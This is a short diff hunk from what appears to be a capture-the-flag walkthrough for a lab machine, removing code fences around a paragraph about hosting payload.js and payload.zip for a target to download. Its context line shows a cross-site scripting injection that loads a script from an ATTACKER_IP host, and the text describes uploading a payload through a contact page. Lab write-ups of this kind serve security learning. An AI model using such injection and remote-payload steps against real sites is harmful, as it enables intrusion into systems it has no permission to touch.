@@ -205,9 +205,7 @@ http://sea.htb/index.php?page=LoginURL"></form><script+src="http://ATTACKER_IP:8
 
 We have to host the 'payload.js' file and yes 'payload.zip' keep it in the same directory from there we are going to start a simple python http server.
 
-```
 During the execution of the payload.js file from the target, the script will auto download our payload.zip file. Check the above payload.js content again.
-```
 
 Now, let's focus on uploading our payload. Back to the contact.php page - 
 
